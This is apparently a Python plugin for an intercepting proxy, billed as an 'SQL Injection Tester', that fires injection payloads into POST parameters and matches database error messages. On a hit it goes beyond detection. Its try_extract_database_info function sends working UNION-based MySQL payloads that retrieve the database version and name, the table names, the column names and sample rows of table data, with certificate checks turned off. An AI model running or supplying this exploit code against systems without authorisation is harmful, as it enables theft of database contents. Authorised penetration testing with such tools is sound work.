"""
Name: SQL Injection Tester
Description: Tests POST parameters with multiple payloads for SQLi detection, shows results in GUI.
"""

import os
import re
import json
import requests
from urllib.parse import parse_qs, urlencode
from PySide6.QtWidgets import QMessageBox
from bs4 import BeautifulSoup

# Load payloads from file or use default
payload_file = os.path.join(os.path.dirname(__file__), "payloads/payloads.txt")
try:
    with open(payload_file, "r") as f:
        PAYLOADS = [line.strip() for line in f if line.strip()]
except Exception as e:
    print(f"[SQLi Tester] Failed to load payloads: {e}")
    PAYLOADS = ["' OR '1'='1"]

# Advanced SQL error patterns (extends your original patterns with multiple DBMS and formats)
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*?error.*",
    r"SQLSTATE\[[\w\d]+\]:.*?(?=<|\n|$)",
    r"mysql.*?error.*?:.*?(?=<|\n|$)",
    r"ORA-\d{5}:.*?(?=<|\n|$)",
    r"syntax error at or near .*?(?=<|\n|$)",
    r"Unclosed quotation mark.*?(?=<|\n|$)",
    r"You have an error in your SQL syntax.*?(?=<|\n|$)",
    r"Warning.*?on line \d+",
    r"Microsoft OLE DB Provider.*",
    r"ODBC SQL Server Driver.*",
    r"supplied argument is not a valid MySQL.*",
    r"DB2 SQL error: SQLCODE=.*? SQLSTATE=.*?",
    r"mysql_fetch_array.*?expects parameter.*",
    r"error executing query.*",
    r"exception.*",
    r"Fatal error:.*?uncaught.*?exception.*?",
]
COMPILED_PATTERNS = [re.compile(pat, re.IGNORECASE | re.DOTALL) for pat in SQL_ERROR_PATTERNS]

def strip_html_tags(text: str) -> str:
    """Remove HTML tags and entities from text."""
    soup = BeautifulSoup(text, "html.parser")
    return soup.get_text(separator="\n")

def extract_from_json(json_obj, key_candidates=None):
    """Recursively search JSON object for SQL error messages."""
    if key_candidates is None:
        key_candidates = ["error", "message", "detail", "description", "exception", "sqlerror", "sql_error"]
    errors = []
    def recursive_search(obj):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k.lower() in key_candidates and isinstance(v, str):
                    for pat in COMPILED_PATTERNS:
                        if pat.search(v):
                            errors.append(v.strip())
                            break
                else:
                    recursive_search(v)
        elif isinstance(obj, list):
            for item in obj:
                recursive_search(item)
    recursive_search(json_obj)
    return errors

def try_extract_database_info(url, param, base_params, headers):
    """
    After detecting SQLi on param, try extracting:
    - Database version/name
    - Table names
    - Sample data from tables

    Uses simple blind/error-based payloads for MySQL.
    """

    test_headers = {k: v for k, v in headers.items() if k.lower() != "content-length"}
    test_headers["Content-Type"] = "application/x-www-form-urlencoded"

    info_results = {}

    # 1. Extract database version
    payload_version = "' UNION SELECT NULL, @@version -- "
    info_results['db_version'] = None
    try:
        params = {k: v[:] for k, v in base_params.items()}
        params[param] = [payload_version]
        data = urlencode(params, doseq=True)
        resp = requests.post(url, data=data, headers=test_headers, verify=False, timeout=10)
        version_match = re.search(r'([0-9]+\.[0-9]+\.[0-9]+)', resp.text)
        if version_match:
            info_results['db_version'] = version_match.group(0)
        else:
            # fallback: try to extract full line containing 'version'
            lines = [line for line in resp.text.splitlines() if 'version' in line.lower()]
            info_results['db_version'] = lines[0] if lines else None
    except Exception:
        pass

    # 2. Extract database name
    payload_dbname = "' UNION SELECT NULL, database() -- "
    info_results['db_name'] = None
    try:
        params = {k: v[:] for k, v in base_params.items()}
        params[param] = [payload_dbname]
        data = urlencode(params, doseq=True)
        resp = requests.post(url, data=data, headers=test_headers, verify=False, timeout=10)
        dbname_match = re.search(r'([a-zA-Z0-9_]+)', resp.text)
        if dbname_match:
            info_results['db_name'] = dbname_match.group(0)
    except Exception:
        pass

    # 3. Extract table names (MySQL)
    payload_tables = "' UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- "
    info_results['tables'] = None
    try:
        params = {k: v[:] for k, v in base_params.items()}
        params[param] = [payload_tables]
        data = urlencode(params, doseq=True)
        resp = requests.post(url, data=data, headers=test_headers, verify=False, timeout=10)
        # Extract comma-separated table names from response
        tables_match = re.search(r'([a-zA-Z0-9_,]+)', resp.text)
        if tables_match:
            tables = tables_match.group(0).split(',')
            info_results['tables'] = tables
    except Exception:
        pass

    # 4. Extract sample data from first table (if any)
    info_results['sample_data'] = None
    if info_results.get('tables'):
        first_table = info_results['tables'][0]
        payload_data = f"' UNION SELECT NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{first_table}' -- "
        try:
            params = {k: v[:] for k, v in base_params.items()}
            params[param] = [payload_data]
            data = urlencode(params, doseq=True)
            resp = requests.post(url, data=data, headers=test_headers, verify=False, timeout=10)
            columns_match = re.search(r'([a-zA-Z0-9_,]+)', resp.text)
            columns = columns_match.group(0).split(',') if columns_match else []
            
            # Try fetching first 3 rows concatenated (assumes 2 columns, adjust as needed)
            if columns:
                select_cols = ',0x3a,'.join(columns[:2])  # join columns with ':' separator
                payload_rows = f"' UNION SELECT NULL, GROUP_CONCAT({select_cols} SEPARATOR 0x0a) FROM {first_table} LIMIT 3 -- "
                params[param] = [payload_rows]
                data = urlencode(params, doseq=True)
                resp = requests.post(url, data=data, headers=test_headers, verify=False, timeout=10)
                info_results['sample_data'] = resp.text[:1000]  # first 1000 chars for display
        except Exception:
            pass

    return info_results


def extract_sql_error(response_text):
    """
    Extract SQL error messages from response text (HTML, JSON, or plain text).
    Returns a list of found error messages or None if none found.
    """
    errors_found = []

    # Try JSON parse
    try:
        parsed_json = json.loads(response_text)
        errors_found.extend(extract_from_json(parsed_json))
        if errors_found:
            return errors_found
    except json.JSONDecodeError:
        pass

    # Strip HTML tags if present
    text = strip_html_tags(response_text)

    # Apply regex patterns
    for pat in COMPILED_PATTERNS:
        for match in pat.finditer(text):
            error_text = match.group(0).strip()
            if error_text not in errors_found:
                errors_found.append(error_text)

    if errors_found:
        return errors_found

    # Fallback: search keywords with snippet
    fallback_keywords = ["Error:", "exception", "invalid", "syntax", "sql", "database"]
    lower_text = text.lower()
    for keyword in fallback_keywords:
        if keyword in lower_text:
            idx = lower_text.find(keyword)
            snippet = text[max(0, idx - 50): idx + 100]
            snippet_clean = snippet.replace("\n", " ").replace("\r", " ").strip()
            return [f"Possible error context: {snippet_clean[:150]}..."]

    return None

def run(request, response):
    """
    Main function to test POST parameters with SQLi payloads and detect errors.
    Displays results in GUI message boxes.
    """
    try:
        url = request.url
        method = getattr(request, "method", "GET").upper()
        headers = getattr(request, "headers", {})

        if method != "POST":
            print("[SQLi Tester] Skipped: Not a POST request.")
            return

        body = request.get_text()
        params = parse_qs(body)

        if not params:
            print("[SQLi Tester] No POST parameters found.")
            return

        vulnerable_info = []

        # for param in params.keys():
        #     for payload in PAYLOADS:
        #         test_params = params.copy()
        #         test_params[param] = [payload]

        #         test_body = urlencode(test_params, doseq=True)
        #         test_headers = {k: v for k, v in headers.items() if k.lower() != "content-length"}
        #         test_headers["Content-Type"] = "application/x-www-form-urlencoded"

        #         try:
        #             resp = requests.post(url, data=test_body, headers=test_headers, verify=False, timeout=10)
        #             errors = extract_sql_error(resp.text)
        #             print(f"{request.url}?{param}={payload}")
        #             print(resp.text[:5000])
        #             if errors:
        #                 vulnerable_info.append({
        #                     "parameter": param,
        #                     "payload": payload,
        #                     "error_messages": errors
        #                 })
        #                 print(f"[SQLi Tester] Potential SQLi in parameter '{param}' with payload '{payload}'.")
        #                 break  # Stop further payloads on first error found
        #         except Exception as e:
        #             print(f"[SQLi Tester] Error testing parameter '{param}' with payload '{payload}': {e}")

        for param in params.keys():
            for payload in PAYLOADS:
                test_params = {k: v[:] for k, v in params.items()}  # Deep copy to avoid mutation
                test_params[param] = [payload]

                test_body = urlencode(test_params, doseq=True)
                test_headers = {k: v for k, v in headers.items() if k.lower() != "content-length"}
                test_headers["Content-Type"] = "application/x-www-form-urlencoded"
                if "Cookie" in headers:
                    test_headers["Cookie"] = headers["Cookie"]

                print(f"Testing URL: {url}")
                print(f"Testing param={param} payload={payload}")
                print(f"POST body: {test_body}")
                print(f"Headers: {test_headers}")

                try:
                    resp = requests.post(url, data=test_body, headers=test_headers, verify=False, timeout=10)
                    print(f"Response code: {resp.status_code}")
                    print(f"Response snippet: {resp.text[:500]}")

                    errors = extract_sql_error(resp.text)
                    if errors:
                         # Extract DB info after detection
                        db_info = try_extract_database_info(url, param, params, headers)
                        vulnerable_info.append({
                            "parameter": param,
                            "payload": payload,
                            # "error_messages": errors,
                            "db_info": db_info
                        })
                        print(f"[SQLi Tester] Potential SQLi in parameter '{param}' with payload '{payload}'.")
                        break
                except Exception as e:
                    print(f"[SQLi Tester] Error testing parameter '{param}' with payload '{payload}': {e}")


        if vulnerable_info:
            message = "<b>Potential SQL Injection Detected!</b><br><br>"
            # for info in vulnerable_info:
            #     message += (
            #         f"<b>Parameter:</b> {info['parameter']}<br>"
            #         f"<b>Payload:</b> {info['payload']}<br>"
            #         f"<b>SQL Error(s):</b><br>"
            #     )
            #     for err in info["error_messages"]:
            #         message += f"{err}<br>"
            #     message += "<br>"
            for info in vulnerable_info:
                message += (
                    f"<b>Parameter:</b> {info['parameter']}<br>"
                    f"<b>Payload:</b> {info['payload']}<br>"
                    # f"<b>SQL Error(s):</b><br>"
                )
                # for err in info["error_messages"]:
                #     message += f"{err}<br>"

                db_info = info.get("db_info", {})
                if db_info:
                    if db_info.get("db_version"):
                        message += f"<b>DB Version:</b> {db_info['db_version']}<br>"
                    if db_info.get("db_name"):
                        message += f"<b>DB Name:</b> {db_info['db_name']}<br>"
                    if db_info.get("tables"):
                        message += f"<b>Tables:</b> {', '.join(db_info['tables'])}<br>"
                    if db_info.get("sample_data"):
                        message += f"<b>Sample Data (first 1000 chars):</b><br><pre>{db_info['sample_data']}</pre><br>"

                message += "<br>"


            msg_box = QMessageBox()
            msg_box.setWindowTitle("SQL Injection Tester")
            msg_box.setIcon(QMessageBox.Warning)
            msg_box.setText(message)
            msg_box.setStandardButtons(QMessageBox.Ok)
            msg_box.exec()

            if hasattr(response, "headers"):
                response.headers["X-ProxyLite-SQLi-Detected"] = "Yes"

        else:
            msg_box = QMessageBox()
            msg_box.setWindowTitle("SQL Injection Tester")
            msg_box.setIcon(QMessageBox.Information)
            msg_box.setText("No SQL Injection detected on tested parameters.")
            msg_box.exec()

    except Exception as e:
        msg_box = QMessageBox()
        msg_box.setWindowTitle("SQL Injection Tester")
        msg_box.setIcon(QMessageBox.Critical)
        msg_box.setText(f"Error during SQLi testing:\n{e}")
        msg_box.exec()
        print(f"[SQLi Tester] Error during testing: {e}")

# If you want to test standalone, you can add a main block and mock request/response.
